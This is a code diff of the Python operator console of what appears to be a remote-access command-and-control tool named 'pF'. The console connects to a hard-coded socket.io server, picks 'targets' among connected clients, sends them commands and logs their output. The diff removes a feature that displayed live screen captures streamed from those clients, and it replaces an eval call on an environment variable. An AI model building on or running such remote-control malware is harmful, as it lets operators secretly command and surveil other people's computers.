@@ -1,7 +1,6 @@
 import socketio
 import threading
 import time
-import cv2
 import json
 import os
 import tkinter.messagebox as tkm
@@ -13,7 +12,7 @@ load_dotenv()
 
 DEBUG = os.environ['DEBUG'] #True/False
 
-match eval(DEBUG):
+match DEBUG:
     case True:
         SERVER = 'https://3000-p0syd0n-padfootserver-bziowkwf04k.ws-us102.gitpod.io'
     case False:
@@ -28,7 +27,6 @@ connected = False
 waiting = False
 selected_target = ""
 cached_clients = {}
-streams = []
 help_text = '''
 pF Help Menu
 Welcome to pF!
@@ -58,28 +56,6 @@ Here are the basic commands:
     is_script : is the new file an unbuilt python script. "True" / "False"
 
 '''
-
-class Stream:
-    def __init__(self, client):
-        self.streaming_screen = True
-        self.window_name = f"Stream: {client}"
-        cv2.namedWindow(self.window_name, cv2.WINDOW_NORMAL)
-        self.client = client
-        streams.append(self)
-
-    def update(self, image_base64):
-        if self.streaming_screen:
-            image_data = base64.b64decode(image_base64)
-            image_np = np.frombuffer(image_data, dtype=np.uint8)
-            frame = cv2.imdecode(image_np, flags=cv2.IMREAD_COLOR)
-
-            cv2.imshow(self.window_name, frame)
-            cv2.waitKey(1)
-
-    def kill(self):
-        self.streaming_screen = False
-        cv2.destroyAllWindows()
-
 def clear():
     # Check the operating system
     system = platform.system()
@@ -189,19 +165,6 @@ def sendCommandResponse(data):
                 open('log.txt', 'a').write(f'{data["client"]} output for command:\n{data["originalCommand"]}\n\n{data["output"]}\n\n\n\n')
             case 'info':
                 tkm.showinfo(f'pF | {data["client"]}', f'{data["client"]} output for command:\n{data["originalCommand"]}\n\n{data["output"]}')
-
-@sio.on('imageFromClientForwarding')
-def imageFromClientForwarding(data):
-    global screen_stream
-    image_base64 = data['image']
-    for stream in streams:
-        if stream.client == data['id']:
-            stream.update(image_base64)
-            return
-
-    screen_stream = Stream(client=data['id'])
-    screen_stream.update(image_base64)
-    
 
 @sio.on('getConnectedClientsResponse')
 def shellGetConnectedClientsResponse(data):
